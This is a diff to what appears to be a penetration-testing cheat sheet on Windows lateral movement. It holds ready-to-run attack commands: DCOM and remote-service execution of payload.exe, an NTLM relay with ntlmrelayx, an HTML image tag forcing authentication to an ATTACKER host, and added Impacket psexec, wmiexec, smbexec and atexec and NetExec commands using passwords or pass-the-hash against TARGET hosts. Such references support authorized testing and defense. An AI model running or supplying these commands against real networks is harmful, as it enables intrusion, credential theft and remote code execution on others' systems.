@@ -34,7 +34,7 @@ $a.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c payload.exe","7")
 # Check signing
 nmap -p 445 TARGET -sS --script smb-security-mode.nse
 # Relay attack
-smbrelayx.py -h VICTIM2 -c "ipconfig"
+ntlmrelayx.py -t VICTIM2 -c "ipconfig" -smb2support
 # Force auth via HTML: <img src="file://ATTACKER/img.jpg">
 ```
 
@@ -42,4 +42,31 @@ smbrelayx.py -h VICTIM2 -c "ipconfig"
 ```cmd
 sc \\TARGET create evilsvc binpath= "c:\payload.exe"
 sc \\TARGET start evilsvc
+```
+
+## Impacket (Linux / Kali)
+```bash
+# PsExec-style (uploads service binary, very common)
+impacket-psexec domain/user:pass@TARGET
+impacket-psexec -hashes :NTLM_HASH domain/user@TARGET
+
+# WMI execution (semi-interactive shell)
+impacket-wmiexec domain/user:pass@TARGET
+impacket-wmiexec -hashes :NTLM_HASH domain/user@TARGET
+
+# SMB execution (creates service, no disk write for shell)
+impacket-smbexec domain/user:pass@TARGET
+
+# Scheduled task execution
+impacket-atexec domain/user:pass@TARGET "whoami"
+```
+
+## CrackMapExec / NetExec
+```bash
+# Command execution across multiple hosts
+nxc smb TARGETS -u user -p pass -x "whoami"
+nxc smb TARGETS -u user -H NTLM_HASH -x "ipconfig"
+
+# Check admin access without executing
+nxc smb TARGETS -u user -p pass
 ```
